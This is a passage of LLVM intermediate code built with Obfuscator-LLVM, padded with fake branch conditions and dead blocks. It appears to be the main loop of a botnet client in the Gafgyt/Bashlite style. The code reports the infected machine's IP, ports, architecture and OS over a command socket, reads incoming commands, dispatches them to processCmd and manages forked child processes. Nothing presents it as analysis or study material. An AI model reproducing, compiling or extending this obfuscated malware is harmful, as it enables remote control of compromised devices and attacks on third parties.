  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %164

; <label>:438:                                    ; preds = %416
  %439 = load i8*, i8** %15, align 8
  store i8 0, i8* %439, align 1
  %440 = load i8*, i8** %14, align 8
  %441 = getelementptr inbounds i8, i8* %440, i64 1
  store i8* %441, i8** %15, align 8
  %442 = load i8*, i8** %14, align 8
  %443 = load i8*, i8** %15, align 8
  %444 = call i64 @strlen(i8* %443) #10
  %445 = getelementptr inbounds i8, i8* %442, i64 %444
  %446 = getelementptr inbounds i8, i8* %445, i64 2
  store i8* %446, i8** %14, align 8
  br label %447

; <label>:447:                                    ; preds = %originalBBpart287, %438
  %448 = load i8*, i8** %14, align 8
  %449 = load i8*, i8** %14, align 8
  %450 = call i64 @strlen(i8* %449) #10
  %451 = sub i64 %450, 1
  %452 = getelementptr inbounds i8, i8* %448, i64 %451
  %453 = load i8, i8* %452, align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 10
  br i1 %455, label %465, label %456

; <label>:456:                                    ; preds = %447
  %457 = load i8*, i8** %14, align 8
  %458 = load i8*, i8** %14, align 8
  %459 = call i64 @strlen(i8* %458) #10
  %460 = sub i64 %459, 1
  %461 = getelementptr inbounds i8, i8* %457, i64 %460
  %462 = load i8, i8* %461, align 1
  %463 = zext i8 %462 to i32
  %464 = icmp eq i32 %463, 13
  br label %465

; <label>:465:                                    ; preds = %456, %447
  %466 = phi i1 [ true, %447 ], [ %464, %456 ]
  %467 = load i32, i32* @x.57
  %468 = load i32, i32* @y.58
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %465
  %475 = load i32, i32* @x.57
  %476 = load i32, i32* @y.58
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %466, label %483, label %505

; <label>:483:                                    ; preds = %originalBBpart279
  %484 = load i32, i32* @x.57
  %485 = load i32, i32* @y.58
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %483
  %492 = load i8*, i8** %14, align 8
  %493 = load i8*, i8** %14, align 8
  %494 = call i64 @strlen(i8* %493) #10
  %495 = sub i64 %494, 1
  %496 = getelementptr inbounds i8, i8* %492, i64 %495
  store i8 0, i8* %496, align 1
  %497 = load i32, i32* @x.57
  %498 = load i32, i32* @y.58
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart287, label %originalBB81alteredBB

originalBBpart287:                                ; preds = %originalBB81
  br label %447

; <label>:505:                                    ; preds = %originalBBpart279
  %506 = load i8*, i8** %14, align 8
  store i8* %506, i8** %16, align 8
  br label %507

; <label>:507:                                    ; preds = %535, %505
  %508 = load i8*, i8** %14, align 8
  %509 = load i8, i8* %508, align 1
  %510 = zext i8 %509 to i32
  %511 = icmp ne i32 %510, 32
  br i1 %511, label %512, label %533

; <label>:512:                                    ; preds = %507
  %513 = load i32, i32* @x.57
  %514 = load i32, i32* @y.58
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %512
  %521 = load i8*, i8** %14, align 8
  %522 = load i8, i8* %521, align 1
  %523 = zext i8 %522 to i32
  %524 = icmp ne i32 %523, 0
  %525 = load i32, i32* @x.57
  %526 = load i32, i32* @y.58
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %533

; <label>:533:                                    ; preds = %originalBBpart291, %507
  %534 = phi i1 [ false, %507 ], [ %524, %originalBBpart291 ]
  br i1 %534, label %535, label %538

; <label>:535:                                    ; preds = %533
  %536 = load i8*, i8** %14, align 8
  %537 = getelementptr inbounds i8, i8* %536, i32 1
  store i8* %537, i8** %14, align 8
  br label %507

; <label>:538:                                    ; preds = %533
  %539 = load i32, i32* @x.57
  %540 = load i32, i32* @y.58
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %538
  %547 = load i8*, i8** %14, align 8
  store i8 0, i8* %547, align 1
  %548 = load i8*, i8** %14, align 8
  %549 = getelementptr inbounds i8, i8* %548, i32 1
  store i8* %549, i8** %14, align 8
  %550 = load i8*, i8** %16, align 8
  store i8* %550, i8** %17, align 8
  %551 = load i32, i32* @x.57
  %552 = load i32, i32* @y.58
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %559

; <label>:559:                                    ; preds = %563, %originalBBpart295
  %560 = load i8*, i8** %17, align 8
  %561 = load i8, i8* %560, align 1
  %562 = icmp ne i8 %561, 0
  br i1 %562, label %563, label %572

; <label>:563:                                    ; preds = %559
  %564 = load i8*, i8** %17, align 8
  %565 = load i8, i8* %564, align 1
  %566 = zext i8 %565 to i32
  %567 = call i32 @toupper(i32 %566) #10
  %568 = trunc i32 %567 to i8
  %569 = load i8*, i8** %17, align 8
  store i8 %568, i8* %569, align 1
  %570 = load i8*, i8** %17, align 8
  %571 = getelementptr inbounds i8, i8* %570, i32 1
  store i8* %571, i8** %17, align 8
  br label %559

; <label>:572:                                    ; preds = %559
  store i32 1, i32* %19, align 4
  %573 = load i8*, i8** %14, align 8
  %574 = call i8* @strtok(i8* %573, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %574, i8** %20, align 8
  %575 = load i8*, i8** %16, align 8
  %576 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %575, i8** %576, align 16
  br label %577

; <label>:577:                                    ; preds = %originalBBpart2103, %572
  %578 = load i8*, i8** %20, align 8
  %579 = icmp ne i8* %578, null
  br i1 %579, label %580, label %642

; <label>:580:                                    ; preds = %577
  %581 = load i32, i32* @x.57
  %582 = load i32, i32* @y.58
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %580
  %589 = load i8*, i8** %20, align 8
  %590 = load i8, i8* %589, align 1
  %591 = zext i8 %590 to i32
  %592 = icmp ne i32 %591, 10
  %593 = load i32, i32* @x.57
  %594 = load i32, i32* @y.58
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %592, label %601, label %624

; <label>:601:                                    ; preds = %originalBBpart299
  %602 = load i8*, i8** %20, align 8
  %603 = call i64 @strlen(i8* %602) #10
  %604 = add i64 %603, 1
  %605 = call noalias i8* @malloc(i64 %604) #6
  %606 = load i32, i32* %19, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %607
  store i8* %605, i8** %608, align 8
  %609 = load i32, i32* %19, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %610
  %612 = load i8*, i8** %611, align 8
  %613 = load i8*, i8** %20, align 8
  %614 = call i64 @strlen(i8* %613) #10
  %615 = add i64 %614, 1
  call void @llvm.memset.p0i8.i64(i8* %612, i8 0, i64 %615, i32 1, i1 false)
  %616 = load i32, i32* %19, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %617
  %619 = load i8*, i8** %618, align 8
  %620 = load i8*, i8** %20, align 8
  %621 = call i8* @strcpy(i8* %619, i8* %620) #6
  %622 = load i32, i32* %19, align 4
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %19, align 4
  br label %624

; <label>:624:                                    ; preds = %601, %originalBBpart299
  %625 = load i32, i32* @x.57
  %626 = load i32, i32* @y.58
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %624
  %633 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %633, i8** %20, align 8
  %634 = load i32, i32* @x.57
  %635 = load i32, i32* @y.58
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %577

; <label>:642:                                    ; preds = %577
  %643 = load i32, i32* %19, align 4
  %644 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i32 0, i32 0
  call void @processCmd(i32 %643, i8** %644)
  %645 = load i32, i32* %19, align 4
  %646 = icmp sgt i32 %645, 1
  br i1 %646, label %647, label %693

; <label>:647:                                    ; preds = %642
  %648 = load i32, i32* @x.57
  %649 = load i32, i32* @y.58
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %647
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  %656 = load i32, i32* @x.57
  %657 = load i32, i32* @y.58
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %664

; <label>:664:                                    ; preds = %689, %originalBBpart2107
  %665 = load i32, i32* %21, align 4
  %666 = load i32, i32* %19, align 4
  %667 = icmp slt i32 %665, %666
  br i1 %667, label %668, label %692

; <label>:668:                                    ; preds = %664
  %669 = load i32, i32* @x.57
  %670 = load i32, i32* @y.58
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %668
  %677 = load i32, i32* %21, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %678
  %680 = load i8*, i8** %679, align 8
  call void @free(i8* %680) #6
  %681 = load i32, i32* @x.57
  %682 = load i32, i32* @y.58
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %689

; <label>:689:                                    ; preds = %originalBBpart2111
  %690 = load i32, i32* %21, align 4
  %691 = add nsw i32 %690, 1
  store i32 %691, i32* %21, align 4
  br label %664

; <label>:692:                                    ; preds = %664
  br label %693

; <label>:693:                                    ; preds = %692, %642
  br label %694

; <label>:694:                                    ; preds = %693, %originalBBpart267
  %695 = load i32, i32* @x.57
  %696 = load i32, i32* @y.58
  %697 = sub i32 %695, 1
  %698 = mul i32 %695, %697
  %699 = urem i32 %698, 2
  %700 = icmp eq i32 %699, 0
  %701 = icmp slt i32 %696, 10
  %702 = or i1 %700, %701
  br i1 %702, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %694
  %703 = load i32, i32* @x.57
  %704 = load i32, i32* @y.58
  %705 = sub i32 %703, 1
  %706 = mul i32 %703, %705
  %707 = urem i32 %706, 2
  %708 = icmp eq i32 %707, 0
  %709 = icmp slt i32 %704, 10
  %710 = or i1 %708, %709
  br i1 %710, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %164

; <label>:711:                                    ; preds = %originalBBpart224
  br label %134
                                                  ; No predecessors!
  %713 = load i32, i32* %3, align 4
  ret i32 %713

originalBBalteredBB:                              ; preds = %originalBB, %37
  %714 = call i32 @fork() #6
  store i32 %714, i32* %7, align 4
  %715 = icmp ne i32 %714, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %716 = load i32, i32* %7, align 4
  %717 = icmp ne i32 %716, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %96
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %113
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %139
  %718 = load i32, i32* @mainCommSock, align 4
  %719 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %720 = call i8* @inet_ntoa(i32 %719) #6
  %721 = call i8* @getPortz()
  %722 = call i8* @getBuildz()
  %723 = call i8* @getArch()
  %724 = call i8* @getOS()
  %725 = call i32 (i32, i8*, ...) @sockprintf(i32 %718, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.39, i32 0, i32 0), i8* %720, i8* %721, i8* %722, i8* %723, i8* %724)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %164
  %726 = load i32, i32* @mainCommSock, align 4
  %727 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %728 = call i32 @recvLine(i32 %726, i8* %727, i32 4096)
  store i32 %728, i32* %10, align 4
  %729 = icmp ne i32 %728, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %186
  %730 = load i32, i32* %11, align 4
  %731 = sext i32 %730 to i64
  %732 = load i64, i64* @numpids, align 8
  %733 = icmp ult i64 %731, %732
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %207
  %734 = load i32*, i32** @pids, align 8
  %735 = load i32, i32* %11, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds i32, i32* %734, i64 %736
  %738 = load i32, i32* %737, align 4
  %739 = call i32 @waitpid(i32 %738, i32* null, i32 1)
  %740 = icmp sgt i32 %739, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %231
  %741 = load i32, i32* %11, align 4
  %_ = shl i32 %741, 1
  %_35 = shl i32 %741, 1
  %_36 = shl i32 %741, 1
  %_37 = sub i32 %741, 1
  %gen = mul i32 %_37, 1
  %742 = add nsw i32 %741, 1
  store i32 %742, i32* %13, align 4
  br label %originalBB34

originalBB41alteredBB:                            ; preds = %originalBB41, %250
  %743 = load i32, i32* %13, align 4
  %744 = zext i32 %743 to i64
  %745 = load i64, i64* @numpids, align 8
  %746 = icmp ult i64 %744, %745
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %298
  %747 = load i32, i32* %13, align 4
  %748 = zext i32 %747 to i64
  %749 = load i64, i64* @numpids, align 8
  %750 = icmp ult i64 %748, %749
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %337
  %751 = load i32, i32* %11, align 4
  %_50 = sub i32 0, %751
  %gen51 = add i32 %_50, 1
  %_52 = shl i32 %751, 1
  %_53 = sub i32 0, %751
  %gen54 = add i32 %_53, 1
  %_55 = sub i32 %751, 1
  %gen56 = mul i32 %_55, 1
  %_57 = sub i32 %751, 1
  %gen58 = mul i32 %_57, 1
  %_59 = sub i32 %751, 1
  %gen60 = mul i32 %_59, 1
  %_61 = shl i32 %751, 1
  %752 = add nsw i32 %751, 1
  store i32 %752, i32* %11, align 4
  br label %originalBB49

originalBB65alteredBB:                            ; preds = %originalBB65, %356
  %753 = load i32, i32* %10, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %754
  store i8 0, i8* %755, align 1
  %756 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %756)
  %757 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %757, i8** %14, align 8
  %758 = load i8*, i8** %14, align 8
  %759 = load i8, i8* %758, align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 33
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %397
  %762 = load i8*, i8** %15, align 8
  %763 = getelementptr inbounds i8, i8* %762, i32 1
  store i8* %763, i8** %15, align 8
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %421
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %465
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %483
  %764 = load i8*, i8** %14, align 8
  %765 = load i8*, i8** %14, align 8
  %766 = call i64 @strlen(i8* %765) #10
  %_82 = sub i64 0, %766
  %gen83 = add i64 %_82, 1
  %_84 = sub i64 0, %766
  %gen85 = add i64 %_84, 1
  %767 = sub i64 %766, 1
  %768 = getelementptr inbounds i8, i8* %764, i64 %767
  store i8 0, i8* %768, align 1
  br label %originalBB81

originalBB89alteredBB:                            ; preds = %originalBB89, %512
  %769 = load i8*, i8** %14, align 8
  %770 = load i8, i8* %769, align 1
  %771 = zext i8 %770 to i32
  %772 = icmp ne i32 %771, 0
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %538
  %773 = load i8*, i8** %14, align 8
  store i8 0, i8* %773, align 1
  %774 = load i8*, i8** %14, align 8
  %775 = getelementptr inbounds i8, i8* %774, i32 1
  store i8* %775, i8** %14, align 8
  %776 = load i8*, i8** %16, align 8
  store i8* %776, i8** %17, align 8
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %580
  %777 = load i8*, i8** %20, align 8
  %778 = load i8, i8* %777, align 1
  %779 = zext i8 %778 to i32
  %780 = icmp ne i32 %779, 10
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %624
  %781 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %781, i8** %20, align 8
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %647
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %668
  %782 = load i32, i32* %21, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %783
  %785 = load i8*, i8** %784, align 8
  call void @free(i8* %785) #6
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %694
  br label %originalBB113
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146660393}
!2 = !{i32 -2146659702}
!3 = !{i32 -2146658953}
